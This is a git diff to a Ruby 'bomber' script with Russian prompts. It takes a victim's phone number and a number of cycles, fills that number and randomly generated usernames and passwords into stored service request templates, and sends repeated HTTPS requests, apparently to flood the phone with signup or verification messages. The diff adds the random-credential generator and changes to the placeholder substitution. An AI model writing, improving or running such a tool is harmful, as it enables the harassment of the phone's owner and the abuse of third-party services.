@@ -15,7 +15,7 @@ def main
 
   phone = input('Введите номер(Пример: +796...): ').strip
   # phone without plus
-  phone_np = phone.sub('+', '') if phone.include? '+'
+  phone_np = phone.sub('+', '')
 
   cycles = input('Введите количество проходов: ').to_i
   put_debug "Phone: #{phone}, Phone without plus: #{phone_np}, cycles: #{cycles}"
@@ -29,10 +29,16 @@ def main
     # get all jsons
     services[i] = File.read services[i]
     services[i] = JSON.parse services[i]
-    services[i] = substitute(services[i], '$phone', phone)
-    services[i] = substitute(services[i], '$phone_np', phone_np)
+
+    # checks
+    services[i] = substitute(services[i], '$phone', phone) if services[i]['params'].include? '$json'
+    services[i] = substitute(services[i], '$phone_np', phone_np) if services[i]['params'].include? '$json'
+    services[i] = substitute(services[i], '$password', gen_something) if services[i]['params'].include? '$password'
+    services[i] = substitute(services[i], '$username', gen_something) if services[i]['params'].include? '$username'
+    services[i]['url'] = services[i]['url'].gsub('$phone', phone) if services[i]['params'].include? '$url'
+    services[i]['url'] = services[i]['url'].gsub('$phone_np', phone_np) if services[i]['params'].include? '$url'
+
     put_debug "Service json: #{services[i]}"
-    puts services[i]
   end
 
   (1..cycles).each do |x|
@@ -85,12 +91,29 @@ def bomber(hsh, response)
   end
   result = https.request request
   if response
-    if result.body.size > 250
+    if config('debug')
+      put_debug "#{hsh['name']} response: #{result.body}"
+    elsif result.body.size > 250
       put_anything "#{hsh['name']} response code: #{result.code}"
     else
       put_anything "#{hsh['name']} response: #{result.body}"
     end
   end
+end
+
+def gen_something
+  vowels = "aeiouy".split('')
+  consonants = "bcdfghjklmnpqrstvwxyz".split('')
+  numbers = "1234567890".split('')
+  something = ''
+
+  (0..rand(10)).each do |r|
+    something += vowels[rand(vowels.size)]
+    something += consonants[rand(consonants.size)]
+    something += numbers[rand(numbers.size)]
+  end
+
+  something
 end
 
 
